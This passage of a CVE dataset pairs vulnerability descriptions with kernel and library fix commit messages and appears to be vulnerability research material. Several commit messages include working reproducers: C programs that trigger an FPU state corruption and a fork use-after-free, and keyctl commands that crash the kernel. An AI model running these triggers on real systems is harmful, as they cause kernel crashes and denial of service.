ffff9ba2bc8e42c0 task.stack: ffffa78cc036c000     RIP: 0010:__switch_to+0x5b5/0x5d0     RSP: 0000:ffffa78cc08bbb88 EFLAGS: 00010082     RAX: 00000000fffffffe RBX: ffff9ba2b8bf2180 RCX: 00000000c0000100     RDX: 00000000ffffffff RSI: 000000005cb10700 RDI: ffff9ba2b8bf36c0     RBP: ffffa78cc08bbbd0 R08: 00000000929fdf46 R09: 0000000000000001     R10: 0000000000000000 R11: 0000000000000000 R12: ffff9ba2bc8e42c0     R13: 0000000000000000 R14: ffff9ba2b8bf3680 R15: ffff9ba2bf5d7b40     FS:  00007f7e5cb10700(0000) GS:ffff9ba2bf400000(0000) knlGS:0000000000000000     CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033     CR2: 00000000004005cc CR3: 0000000079fd5000 CR4: 00000000001406e0     Call Trace:     Code: 84 00 00 00 00 00 e9 11 fd ff ff 0f ff 66 0f 1f 84 00 00 00 00 00 e9 e7 fa ff ff 0f ff 66 0f 1f 84 00 00 00 00 00 e9 c2 fa ff ff <0f> ff 66 0f 1f 84 00 00 00 00 00 e9 d4 fc ff ff 66 66 2e 0f 1f  Here is a C reproducer.  The expected behavior is that the program spin forever with no output.  However, on a buggy kernel running on a processor with the ""xsave"" feature but without the ""xsaves"" feature (e.g. Sandy Bridge through Broadwell for Intel), within a second or two the program reports that the xmm registers were corrupted, i.e. were not restored correctly.  With CONFIG_X86_DEBUG_FPU=y it also hits the above kernel warning.      #define _GNU_SOURCE     #include <stdbool.h>     #include <inttypes.h>     #include <linux/elf.h>     #include <stdio.h>     #include <sys/ptrace.h>     #include <sys/uio.h>     #include <sys/wait.h>     #include <unistd.h>      int main(void)     {         int pid = fork();         uint64_t xstate[512];         struct iovec iov = { .iov_base = xstate, .iov_len = sizeof(xstate) };          if (pid == 0) {             bool tracee = true;             for (int i = 0; i < sysconf(_SC_NPROCESSORS_ONLN) && tracee; i++)                 tracee = (fork() != 0);             uint32_t xmm0[4] = { [0 ... 3] = tracee ? 0x00000000 : 0xDEADBEEF };             asm volatile(""   movdqu %0, %%xmm0\n""                          ""   mov %0, %%rbx\n""                          ""1: movdqu %%xmm0, %0\n""                          ""   mov %0, %%rax\n""                          ""   cmp %%rax, %%rbx\n""                          ""   je 1b\n""                          : ""+m"" (xmm0) : : ""rax"", ""rbx"", ""xmm0"");             printf(""BUG: xmm registers corrupted!  tracee=%d, xmm0=%08X%08X%08X%08X\n"",                    tracee, xmm0[0], xmm0[1], xmm0[2], xmm0[3]);         } else {             usleep(100000);             ptrace(PTRACE_ATTACH, pid, 0, 0);             wait(NULL);             ptrace(PTRACE_GETREGSET, pid, NT_X86_XSTATE, &iov);             xstate[65] = -1;             ptrace(PTRACE_SETREGSET, pid, NT_X86_XSTATE, &iov);             ptrace(PTRACE_CONT, pid, 0, 0);             wait(NULL);         }         return 1;     }  Note: the program only tests for the bug using the ptrace() system call. The bug can also be reproduced using the rt_sigreturn() system call, but only when called from a 32-bit program, since for 64-bit programs the kernel restores the FPU state from the signal frame by doing XRSTOR directly from userspace memory (with proper error checking).  Reported-by: Dmitry Vyukov <dvyukov@google.com> Signed-off-by: Eric Biggers <ebiggers@google.com> Reviewed-by: Kees Cook <keescook@chromium.org> Reviewed-by: Rik van Riel <riel@redhat.com> Acked-by: Dave Hansen <dave.hansen@linux.intel.com> Cc: <stable@vger.kernel.org> [v3.17+] Cc: Andrew Morton <akpm@linux-foundation.org> Cc: Andy Lutomirski <luto@amacapital.net> Cc: Andy Lutomirski <luto@kernel.org> Cc: Borislav Petkov <bp@alien8.de> Cc: Eric Biggers <ebiggers3@gmail.com> Cc: Fenghua Yu <fenghua.yu@intel.com> Cc: Kevin Hao <haokexin@gmail.com> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Michael Halcrow <mhalcrow@google.com> Cc: Oleg Nesterov <oleg@redhat.com> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: Wanpeng Li <wanpeng.li@hotmail.com> Cc: Yu-cheng Yu <yu-cheng.yu@intel.com> Cc: kernel-hardening@lists.openwall.com Fixes: 0b29643 (""x86/xsaves: Change compacted format xsave area header"") Link: http://lkml.kernel.org/r/20170922174156.16780-2-ebiggers3@gmail.com Link: http://lkml.kernel.org/r/20170923130016.21448-25-mingo@kernel.org Signed-off-by: Ingo Molnar <mingo@kernel.org>"
CVE-2016-7115,CWE-119,2016-08-30,Buffer overflow in the handle_packet function in mactelnet.c in the client in MAC-Telnet 0.4.3 and earlier allows remote TELNET servers to execute arbitrary code via a long string in an MT_CPTYPE_PASSSALT control packet.,2nd round security fixes from eyalitki
CVE-2013-4312,CWE-119,2016-02-08,"The Linux kernel before 4.4.1 allows local users to bypass file-descriptor limits and cause a denial of service (memory consumption) by sending each descriptor over a UNIX socket before closing it, related to net/unix/af_unix.c and net/unix/garbage.c.",It is possible for a process to allocate and accumulate far more FDs than the process' limit by sending them over a unix socket then closing them to keep the process' fd count low.  This change addresses this problem by keeping track of the number of FDs in flight per user and preventing non-privileged processes from having more FDs in flight than their configured FD limit.  Reported-by: socketpair@gmail.com Reported-by: Tetsuo Handa <penguin-kernel@I-love.SAKURA.ne.jp> Mitigates: CVE-2013-4312 (Linux 2.0+) Suggested-by: Linus Torvalds <torvalds@linux-foundation.org> Acked-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: Willy Tarreau <w@1wt.eu> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2013-4470,CWE-264,2013-11-04,"The Linux kernel before 3.12, when UDP Fragmentation Offload (UFO) is enabled, does not properly initialize certain data structures, which allows local users to cause a denial of service (memory corruption and system crash) or possibly gain privileges via a crafted application that uses the UDP_CORK option in a setsockopt system call and sends both short and long packets, related to the ip_ufo_append_data function in net/ipv4/ip_output.c and the ip6_ufo_append_data function in net/ipv6/ip6_output.c.","Now, if user application does: sendto len<mtu flag MSG_MORE sendto len>mtu flag 0 The skb is not treated as fragmented one because it is not initialized that way. So move the initialization to fix this.  introduced by: commit e89e9cf ""[IPv4/IPv6]: UFO Scatter-gather approach""  Signed-off-by: Jiri Pirko <jiri@resnulli.us> Acked-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2012-1573,CWE-310,2012-03-26,"gnutls_cipher.c in libgnutls in GnuTLS before 2.12.17 and 3.x before 3.0.15 does not properly handle data encrypted with a block cipher, which allows remote attackers to cause a denial of service (heap memory corruption and application crash) via a crafted record, as demonstrated by a crafted GenericBlockCipher structure.",
CVE-2013-5634,CWE-399,2013-09-25,"arch/arm/kvm/arm.c in the Linux kernel before 3.10 on the ARM platform, when KVM is used, allows host OS users to cause a denial of service (NULL pointer dereference, OOPS, and host OS crash) or possibly have unspecified other impact by omitting vCPU initialization before a KVM_GET_REG_LIST ioctl call.","Some ARM KVM VCPU ioctls require the vCPU to be properly initialized with the KVM_ARM_VCPU_INIT ioctl before being used with further requests. KVM_RUN checks whether this initialization has been done, but other ioctls do not. Namely KVM_GET_REG_LIST will dereference an array with index -1 without initialization and thus leads to a kernel oops. Fix this by adding checks before executing the ioctl handlers.   [ Removed superflous comment from static function - Christoffer ]  Changes from v1:  * moved check into a static function with a meaningful name  Signed-off-by: Andre Przywara <andre.przywara@linaro.org> Signed-off-by: Christoffer Dall <cdall@cs.columbia.edu>"
CVE-2017-18360,CWE-369,2019-01-31,"In change_port_settings in drivers/usb/serial/io_ti.c in the Linux kernel before 4.11.3, local users could cause a denial of service by division-by-zero in the serial device layer by trying to set very high baud rates.","Fix a division-by-zero in set_termios when debugging is enabled and a high-enough speed has been requested so that the divisor value becomes zero.  Instead of just fixing the offending debug statement, cap the baud rate at the base as a zero divisor value also appears to crash the firmware.  Fixes: 1da177e4c3f4 (""Linux-2.6.12-rc2"") Cc: stable <stable@vger.kernel.org>     # 2.6.12 Reviewed-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org> Signed-off-by: Johan Hovold <johan@kernel.org>"
CVE-2018-19409,,2018-11-21,An issue was discovered in Artifex Ghostscript before 9.26. LockSafetyParams is not checked correctly if another device is used.,
CVE-2017-14032,CWE-287,2017-08-30,"ARM mbed TLS before 1.3.21 and 2.x before 2.1.9, if optional authentication is configured, allows remote attackers to bypass peer authentication via an X.509 certificate chain with many intermediates. NOTE: although mbed TLS was formerly known as PolarSSL, the releases shipped with the PolarSSL name are not affected.",Everything else is a fatal error. Also improve documentation about that for the vrfy callback.
CVE-2016-6561,CWE-476,2017-03-31,illumos smbsrv NULL pointer dereference allows system crash.,Reviewed by: Gordon Ross <gwr@nexenta.com> Reviewed by: Matt Barden <matt.barden@nexenta.com> Reviewed by: Evan Layton <evan.layton@nexenta.com> Reviewed by: Dan McDonald <danmcd@omniti.com> Approved by: Gordon Ross <gwr@nexenta.com>
CVE-2014-8481,CWE-399,2014-11-10,"The instruction decoder in arch/x86/kvm/emulate.c in the KVM subsystem in the Linux kernel before 3.18-rc2 does not properly handle invalid instructions, which allows guest OS users to cause a denial of service (NULL pointer dereference and host OS crash) via a crafted application that triggers (1) an improperly fetched instruction or (2) an instruction that occupies too many bytes.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2014-8480.","A failure to decode the instruction can cause a NULL pointer access. This is fixed simply by moving the ""done"" label as close as possible to the return.  This fixes CVE-2014-8481.  Reported-by: Andy Lutomirski <luto@amacapital.net> Cc: stable@vger.kernel.org Fixes: 41061cd Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
CVE-2016-7151,CWE-125,2019-05-15,Capstone 3.0.4 has an out-of-bounds vulnerability (SEGV caused by a read memory access) in X86_insn_reg_intel in arch/X86/X86Mapping.c.,
CVE-2015-8324,,2016-05-02,"The ext4 implementation in the Linux kernel before 2.6.34 does not properly track the initialization of certain data structures, which allows physically proximate attackers to cause a denial of service (NULL pointer dereference and panic) via a crafted USB device, related to the ext4_fill_super function.","Allocate uninitialized extent before ext4 buffer write and convert the extent to initialized after io completes. The purpose is to make sure an extent can only be marked initialized after it has been written with new data so we can safely drop the i_mutex lock in ext4 DIO read without exposing stale data. This helps to improve multi-thread DIO read performance on high-speed disks.  Skip the nobh and data=journal mount cases to make things simple for now.  Signed-off-by: Jiaying Zhang <jiayingz@google.com> Signed-off-by: ""Theodore Ts'o"" <tytso@mit.edu>"
CVE-2017-17052,CWE-416,2017-11-29,"The mm_init function in kernel/fork.c in the Linux kernel before 4.12.10 does not clear the ->exe_file member of a new process's mm_struct, allowing a local attacker to achieve a use-after-free or possibly have unspecified other impact by running a specially crafted program.","Commit 7c05126 (""mm, fork: make dup_mmap wait for mmap_sem for write killable"") made it possible to kill a forking task while it is waiting to acquire its ->mmap_sem for write, in dup_mmap().  However, it was overlooked that this introduced an new error path before a reference is taken on the mm_struct's ->exe_file.  Since the ->exe_file of the new mm_struct was already set to the old ->exe_file by the memcpy() in dup_mm(), it was possible for the mmput() in the error path of dup_mm() to drop a reference to ->exe_file which was never taken.  This caused the struct file to later be freed prematurely.  Fix it by updating mm_init() to NULL out the ->exe_file, in the same place it clears other things like the list of mmaps.  This bug was found by syzkaller.  It can be reproduced using the following C program:      #define _GNU_SOURCE     #include <pthread.h>     #include <stdlib.h>     #include <sys/mman.h>     #include <sys/syscall.h>     #include <sys/wait.h>     #include <unistd.h>      static void *mmap_thread(void *_arg)     {         for (;;) {             mmap(NULL, 0x1000000, PROT_READ,                  MAP_POPULATE|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);         }     }      static void *fork_thread(void *_arg)     {         usleep(rand() % 10000);         fork();     }      int main(void)     {         fork();         fork();         fork();         for (;;) {             if (fork() == 0) {                 pthread_t t;                  pthread_create(&t, NULL, mmap_thread, NULL);                 pthread_create(&t, NULL, fork_thread, NULL);                 usleep(rand() % 10000);                 syscall(__NR_exit_group, 0);             }             wait(NULL);         }     }  No special kernel config options are needed.  It usually causes a NULL pointer dereference in __remove_shared_vm_struct() during exit, or in dup_mmap() (which is usually inlined into copy_process()) during fork. Both are due to a vm_area_struct's ->vm_file being used after it's already been freed.  Google Bug Id: 64772007  Link: http://lkml.kernel.org/r/20170823211408.31198-1-ebiggers3@gmail.com Fixes: 7c05126 (""mm, fork: make dup_mmap wait for mmap_sem for write killable"") Signed-off-by: Eric Biggers <ebiggers@google.com> Tested-by: Mark Rutland <mark.rutland@arm.com> Acked-by: Michal Hocko <mhocko@suse.com> Cc: Dmitry Vyukov <dvyukov@google.com> Cc: Ingo Molnar <mingo@kernel.org> Cc: Konstantin Khlebnikov <koct9i@gmail.com> Cc: Oleg Nesterov <oleg@redhat.com> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Vlastimil Babka <vbabka@suse.cz> Cc: <stable@vger.kernel.org>	[v4.7+] Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2012-3511,CWE-362,2012-10-04,Multiple race conditions in the madvise_remove function in mm/madvise.c in the Linux kernel before 3.4.5 allow local users to cause a denial of service (use-after-free and system crash) via vectors involving a (1) munmap or (2) close system call.,"Otherwise the code races with munmap (causing a use-after-free of the vma) or with close (causing a use-after-free of the struct file).  The bug was introduced by commit 90ed52e (""[PATCH] holepunch: fix mmap_sem i_mutex deadlock"")  Cc: Hugh Dickins <hugh@veritas.com> Cc: Miklos Szeredi <mszeredi@suse.cz> Cc: Badari Pulavarty <pbadari@us.ibm.com> Cc: Nick Piggin <npiggin@suse.de> Cc: stable@vger.kernel.org Signed-off-by: Andy Lutomirski <luto@amacapital.net> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2018-19134,CWE-704,2018-12-20,"In Artifex Ghostscript through 9.25, the setpattern operator did not properly validate certain types. A specially crafted PostScript document could exploit this to crash Ghostscript or, possibly, execute arbitrary code in the context of the Ghostscript process. This is a type confusion issue because of failure to check whether the Implementation of a pattern dictionary was a structure type.",
CVE-2007-6761,CWE-119,2017-04-24,"drivers/media/video/videobuf-vmalloc.c in the Linux kernel before 2.6.24 does not initialize videobuf_mapping data structures, which allows local users to trigger an incorrect count value and videobuf leak via unspecified vectors, a different vulnerability than CVE-2010-5321.","This is pretty serious bug.  map->count is never initialized after the call to kmalloc making the count start at some random trash value.  The end result is leaking videobufs.  Also, fix up the debug statements to print unsigned values.  Pushed to http://ifup.org/hg/v4l-dvb too  Signed-off-by: Brandon Philips <bphilips@suse.de> Signed-off-by: Mauro Carvalho Chehab <mchehab@infradead.org>"
CVE-2016-9936,CWE-416,2017-01-04,The unserialize implementation in ext/standard/var.c in PHP 7.x before 7.0.14 allows remote attackers to cause a denial of service (use-after-free) or possibly have unspecified other impact via crafted serialized data.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2015-6834.,
CVE-2008-7316,CWE-20,2016-05-02,"mm/filemap.c in the Linux kernel before 2.6.25 allows local users to cause a denial of service (infinite loop) via a writev system call that triggers an iovec of zero length, followed by a page fault for an iovec of nonzero length.","Frederik Himpe reported an unkillable and un-straceable pan process.  Zero length iovecs can go into an infinite loop in writev, because the iovec iterator does not always advance over them.  The sequence required to trigger this is not trivial. I think it requires that a zero-length iovec be followed by a non-zero-length iovec which causes a pagefault in the atomic usercopy. This causes the writev code to drop back into single-segment copy mode, which then tries to copy the 0 bytes of the zero-length iovec; a zero length copy looks like a failure though, so it loops.  Put a test into iov_iter_advance to catch zero-length iovecs. We could just put the test in the fallback path, but I feel it is more robust to skip over zero-length iovecs throughout the code (iovec iterator may be used in filesystems too, so it should be robust).  Signed-off-by: Nick Piggin <npiggin@suse.de> Signed-off-by: Ingo Molnar <mingo@elte.hu> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-12902,CWE-125,2017-09-14,"The Zephyr parser in tcpdump before 4.9.2 has a buffer over-read in print-zephyr.c, several functions.","Use ND_TTEST() rather than comparing against ndo->ndo_snapend ourselves; it's easy to get the tests wrong.  Check for running out of packet data before checking for running out of captured data, and distinguish between running out of packet data (which might just mean ""no more strings"") and running out of captured data (which means ""truncated"").  This fixes a buffer over-read discovered by Forcepoint's security researchers Otto Airamo & Antti Levomäki.  Add a test using the capture file supplied by the reporter(s)."
CVE-2014-9683,CWE-189,2015-03-03,Off-by-one error in the ecryptfs_decode_from_filename function in fs/ecryptfs/crypto.c in the eCryptfs subsystem in the Linux kernel before 3.18.2 allows local users to cause a denial of service (buffer overflow and system crash) or possibly gain privileges via a crafted filename.,Dmitry Chernenkov used KASAN to discover that eCryptfs writes past the end of the allocated buffer during encrypted filename decoding. This fix corrects the issue by getting rid of the unnecessary 0 write when the current bit offset is 2.  Signed-off-by: Michael Halcrow <mhalcrow@google.com> Reported-by: Dmitry Chernenkov <dmitryc@google.com> Suggested-by: Kees Cook <keescook@chromium.org> Cc: stable@vger.kernel.org # v2.6.29+: 51ca58d eCryptfs: Filename Encryption: Encoding and encryption functions Signed-off-by: Tyler Hicks <tyhicks@canonical.com>
CVE-2016-6823,CWE-190,2017-01-18,"Integer overflow in the BMP coder in ImageMagick before 7.0.2-10 allows remote attackers to cause a denial of service (crash) via crafted height and width values, which triggers an out-of-bounds write.",
CVE-2002-2443,CWE-20,2013-05-29,"schpw.c in the kpasswd service in kadmind in MIT Kerberos 5 (aka krb5) before 1.11.3 does not properly validate UDP packets before sending responses, which allows remote attackers to cause a denial of service (CPU and bandwidth consumption) via a forged packet that triggers a communication loop, as demonstrated by krb_pingpong.nasl, a related issue to CVE-1999-0103.","The kpasswd service provided by kadmind was vulnerable to a UDP ""ping-pong"" attack [CVE-2002-2443].  Don't respond to packets unless they pass some basic validation, and don't respond to our own error packets.  Some authors use CVE-1999-0103 to refer to the kpasswd UDP ping-pong attack or UDP ping-pong attacks in general, but there is discussion leading toward narrowing the definition of CVE-1999-0103 to the echo, chargen, or other similar built-in inetd services.  Thanks to Vincent Danen for alerting us to this issue.  CVSSv2: AV:N/AC:L/Au:N/C:N/I:N/A:P/E:P/RL:O/RC:C  ticket: 7637 (new) target_version: 1.11.3 tags: pullup"
CVE-2015-2922,CWE-17,2015-05-27,The ndisc_router_discovery function in net/ipv6/ndisc.c in the Neighbor Discovery (ND) protocol implementation in the IPv6 stack in the Linux kernel before 3.19.6 allows remote attackers to reconfigure a hop-limit setting via a small hop_limit value in a Router Advertisement (RA) message.,"A local route may have a lower hop_limit set than global routes do.  RFC 3756, Section 4.2.7, ""Parameter Spoofing""  >   1.  The attacker includes a Current Hop Limit of one or another small >       number which the attacker knows will cause legitimate packets to >       be dropped before they reach their destination.  >   As an example, one possible approach to mitigate this threat is to >   ignore very small hop limits.  The nodes could implement a >   configurable minimum hop limit, and ignore attempts to set it below >   said limit.  Signed-off-by: D.S. Ljungmark <ljungmark@modio.se> Acked-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-4301,CWE-119,2016-09-21,Stack-based buffer overflow in the parse_device function in archive_read_support_format_mtree.c in libarchive before 3.2.1 allows remote attackers to execute arbitrary code via a crafted mtree file.,
CVE-2014-4978,CWE-59,2017-12-29,The rs_filter_graph function in librawstudio/rs-filter.c in rawstudio might allow local users to truncate arbitrary files via a symlink attack on (1) /tmp/rs-filter-graph.png or (2) /tmp/rs-filter-graph.,
CVE-2017-13047,CWE-125,2017-09-14,The ISO ES-IS parser in tcpdump before 4.9.2 has a buffer over-read in print-isoclns.c:esis_print().,"The bounds check in esis_print() tested one pointer at the beginning of a loop that incremented another, make the trivial fix. While at it, make the function print a standard marker when it detects truncated data and update some existing ES-IS tests respectively.  This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s)."
CVE-2016-10048,CWE-22,2017-03-23,Directory traversal vulnerability in magick/module.c in ImageMagick 6.9.4-7 allows remote attackers to load arbitrary modules via unspecified vectors.,
CVE-2019-6978,CWE-415,2019-01-28,"The GD Graphics Library (aka LibGD) 2.2.5 has a double free in the gdImage*Ptr() functions in gd_gif_out.c, gd_jpeg.c, and gd_wbmp.c. NOTE: PHP is unaffected.","Even though libgd/libgd#492 is not a relevant bug fix for PHP, since the binding doesn't use the `gdImage*Ptr()` functions at all, we're porting the fix to stay in sync here."
CVE-2016-10250,CWE-476,2017-03-15,The jp2_colr_destroy function in jp2_cod.c in JasPer before 1.900.13 allows remote attackers to cause a denial of service (NULL pointer dereference) by leveraging incorrect cleanup of JP2 box data on error. NOTE: this vulnerability exists because of an incomplete fix for CVE-2016-8887.,
CVE-2014-9870,CWE-264,2016-08-06,"The Linux kernel before 3.11 on ARM platforms, as used in Android before 2016-08-05 on Nexus 5 and 7 (2013) devices, does not properly consider user-space access to the TPIDRURW register, which allows local users to gain privileges via a crafted application, aka Android internal bug 28749743 and Qualcomm internal bug CR561044.","Since commit 6a1c531 the user writeable TLS register was zeroed to prevent it from being used as a covert channel between two tasks.  There are more and more applications coming to Windows RT, Wine could support them, but mostly they expect to have the thread environment block (TEB) in TPIDRURW.  This patch preserves that register per thread instead of clearing it. Unlike the TPIDRURO, which is already switched, the TPIDRURW can be updated from userspace so needs careful treatment in the case that we modify TPIDRURW and call fork(). To avoid this we must always read TPIDRURW in copy_thread.  Signed-off-by: André Hentschel <nerv@dawncrow.de> Signed-off-by: Will Deacon <will.deacon@arm.com> Signed-off-by: Jonathan Austin <jonathan.austin@arm.com> Signed-off-by: Russell King <rmk+kernel@arm.linux.org.uk>"
CVE-2017-16532,CWE-476,2017-11-04,The get_endpoints function in drivers/usb/misc/usbtest.c in the Linux kernel through 4.13.11 allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact via a crafted USB device.,"If the usbtest driver encounters a device with an IN bulk endpoint but no OUT bulk endpoint, it will try to dereference a NULL pointer (out->desc.bEndpointAddress).  The problem can be solved by adding a missing test.  Signed-off-by: Alan Stern <stern@rowland.harvard.edu> Reported-by: Andrey Konovalov <andreyknvl@google.com> Tested-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: Felipe Balbi <felipe.balbi@linux.intel.com>"
CVE-2017-13052,CWE-125,2017-09-14,The CFM parser in tcpdump before 4.9.2 has a buffer over-read in print-cfm.c:cfm_print().,"In cfm_network_addr_print() add a length argument and use it to validate the input buffer.  In cfm_print() add a length check for MAC address chassis ID. Supply cfm_network_addr_print() with the length of its buffer and a correct pointer to the buffer (it was off-by-one before). Change some error handling blocks to skip to the next TLV in the current PDU rather than to stop decoding the PDU. Print the management domain and address contents, although in hex only so far.  Add some comments to clarify the code flow and to tell exact sections in IEEE standard documents. Add new error messages and make some existing messages more specific.  This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s)."
CVE-2015-4167,CWE-189,2015-08-05,"The udf_read_inode function in fs/udf/inode.c in the Linux kernel before 3.19.1 does not validate certain length values, which allows local users to cause a denial of service (incorrect data representation or integer overflow, and OOPS) via a crafted UDF filesystem.",Check length of extended attributes and allocation descriptors when loading inodes from disk. Otherwise corrupted filesystems could confuse the code and make the kernel oops.  Reported-by: Carl Henrik Lunde <chlunde@ping.uio.no> CC: stable@vger.kernel.org Signed-off-by: Jan Kara <jack@suse.cz>
CVE-2014-0063,CWE-119,2014-03-31,"Multiple stack-based buffer overflows in PostgreSQL before 8.4.20, 9.0.x before 9.0.16, 9.1.x before 9.1.12, 9.2.x before 9.2.7, and 9.3.x before 9.3.3 allow remote authenticated users to cause a denial of service (crash) or possibly execute arbitrary code via vectors related to an incorrect MAXDATELEN constant and datetime values involving (1) intervals, (2) timestamps, or (3) timezones, a different vulnerability than CVE-2014-0065.","Many server functions use the MAXDATELEN constant to size a buffer for parsing or displaying a datetime value.  It was much too small for the longest possible interval output and slightly too small for certain valid timestamp input, particularly input with a long timezone name. The long input was rejected needlessly; the long output caused interval_out() to overrun its buffer.  ECPG's pgtypes library has a copy of the vulnerable functions, which bore the same vulnerabilities along with some of its own.  In contrast to the server, certain long inputs caused stack overflow rather than failing cleanly.  Back-patch to 8.4 (all supported versions).  Reported by Daniel Schüssler, reviewed by Tom Lane.  Security: CVE-2014-0063"
CVE-2019-17178,CWE-252,2019-10-04,"HuffmanTree_makeFromFrequencies in lodepng.c in LodePNG through 2019-09-28, as used in WinPR in FreeRDP and other products, has a memory leak because a supplied realloc pointer (i.e., the first argument to realloc) is also used for a realloc return value.",
CVE-2015-0287,CWE-17,2015-03-19,"The ASN1_item_ex_d2i function in crypto/asn1/tasn_dec.c in OpenSSL before 0.9.8zf, 1.0.0 before 1.0.0r, 1.0.1 before 1.0.1m, and 1.0.2 before 1.0.2a does not reinitialize CHOICE and ADB data structures, which might allow attackers to cause a denial of service (invalid write operation and memory corruption) by leveraging an application that relies on ASN.1 structure reuse.",
CVE-2016-9557,CWE-190,2017-03-23,Integer overflow in jas_image.c in JasPer before 1.900.25 allows remote attackers to cause a denial of service (application crash) via a crafted file.,"reworked in order to avoid pollution of the global namespace.  Some problematic types like uchar, ulong, and friends have been replaced with names with a jas_ prefix.  An option max_samples has been added to the BMP and JPEG decoders to restrict the maximum size of image that they can decode.  This change was made as a (possibly temporary) fix to address security concerns. A max_samples command-line option has also been added to imginfo.  Whether an image component (for jas_image_t) is stored in memory or on disk is now based on the component size (rather than the image size).  Some debug log message were added.  Some new integer overflow checks were added.  Some new safe integer add/multiply functions were added.  More pre-C99 cruft was removed.  JasPer has numerous ""hacks"" to handle pre-C99 compilers.  JasPer now assumes C99 support.  So, this pre-C99 cruft is unnecessary and can be removed.  The regression jasper-doublefree-mem_close.jpg has been re-enabled. Theoretically, it should work more predictably now."
CVE-2016-6128,CWE-20,2016-08-07,"The gdImageCropThreshold function in gd_crop.c in the GD Graphics Library (aka libgd) before 2.2.3, as used in PHP before 7.0.9, allows remote attackers to cause a denial of service (application crash) via an invalid color index.",
CVE-2019-12111,CWE-476,2019-05-15,A Denial Of Service vulnerability in MiniUPnP MiniUPnPd through 2.1 exists due to a NULL pointer dereference in copyIPv6IfDifferent in pcpserver.c.,
CVE-2016-9576,CWE-416,2016-12-28,"The blk_rq_map_user_iov function in block/blk-map.c in the Linux kernel before 4.8.14 does not properly restrict the type of iterator, which allows local users to read or write to arbitrary kernel memory locations or cause a denial of service (use-after-free) by leveraging access to a /dev/sg device.","In theory we could map other things, but there's a reason that function is called ""user_iov"".  Using anything else (like splice can do) just confuses it.  Reported-and-tested-by: Johannes Thumshirn <jthumshirn@suse.de> Cc: Al Viro <viro@ZenIV.linux.org.uk> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2014-4027,CWE-200,2014-06-23,"The rd_build_device_space function in drivers/target/target_core_rd.c in the Linux kernel before 3.14 does not properly initialize a certain data structure, which allows local users to obtain sensitive information from ramdisk_mcp memory by leveraging access to a SCSI initiator.",This patch refactors rd_build_device_space() + rd_release_device_space() into rd_allocate_sgl_table() + rd_release_device_space() so that they may be used seperatly for setup + release of protection information scatterlists.  Also add explicit memset of pages within rd_allocate_sgl_table() based upon passed 'init_payload' value.  v2 changes:   - Drop unused sg_table from rd_release_device_space (Wei)  Cc: Martin K. Petersen <martin.petersen@oracle.com> Cc: Christoph Hellwig <hch@lst.de> Cc: Hannes Reinecke <hare@suse.de> Cc: Sagi Grimberg <sagig@mellanox.com> Cc: Or Gerlitz <ogerlitz@mellanox.com> Signed-off-by: Nicholas Bellinger <nab@linux-iscsi.org>
CVE-2017-12644,CWE-772,2017-08-07,ImageMagick 7.0.6-1 has a memory leak vulnerability in ReadDCMImage in coders\dcm.c.,
CVE-2018-1000039,CWE-416,2018-05-24,"In Artifex MuPDF 1.12.0 and earlier, multiple heap use after free bugs in the PDF parser could allow an attacker to execute arbitrary code, read memory, or cause a denial of service via a crafted file.",
CVE-2015-8539,CWE-269,2016-02-08,"The KEYS subsystem in the Linux kernel before 4.4 allows local users to gain privileges or cause a denial of service (BUG) via crafted keyctl commands that negatively instantiate a key, related to security/keys/encrypted-keys/encrypted.c, security/keys/trusted.c, and security/keys/user_defined.c.","If a user key gets negatively instantiated, an error code is cached in the payload area.  A negatively instantiated key may be then be positively instantiated by updating it with valid data.  However, the ->update key type method must be aware that the error code may be there.  The following may be used to trigger the bug in the user key type:      keyctl request2 user user """" @U     keyctl add user user ""a"" @U  which manifests itself as:  	BUG: unable to handle kernel paging request at 00000000ffffff8a 	IP: [<ffffffff810a376f>] __call_rcu.constprop.76+0x1f/0x280 kernel/rcu/tree.c:3046 	PGD 7cc30067 PUD 0 	Oops: 0002 [#1] SMP 	Modules linked in: 	CPU: 3 PID: 2644 Comm: a.out Not tainted 4.3.0+ #49 	Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01/01/2011 	task: ffff88003ddea700 ti: ffff88003dd88000 task.ti: ffff88003dd88000 	RIP: 0010:[<ffffffff810a376f>]  [<ffffffff810a376f>] __call_rcu.constprop.76+0x1f/0x280 	 [<ffffffff810a376f>] __call_rcu.constprop.76+0x1f/0x280 kernel/rcu/tree.c:3046 	RSP: 0018:ffff88003dd8bdb0  EFLAGS: 00010246 	RAX: 00000000ffffff82 RBX: 0000000000000000 RCX: 0000000000000001 	RDX: ffffffff81e3fe40 RSI: 0000000000000000 RDI: 00000000ffffff82 	RBP: ffff88003dd8bde0 R08: ffff88007d2d2da0 R09: 0000000000000000 	R10: 0000000000000000 R11: ffff88003e8073c0 R12: 00000000ffffff82 	R13: ffff88003dd8be68 R14: ffff88007d027600 R15: ffff88003ddea700 	FS:  0000000000b92880(0063) GS:ffff88007fd00000(0000) knlGS:0000000000000000 	CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b 	CR2: 00000000ffffff8a CR3: 000000007cc5f000 CR4: 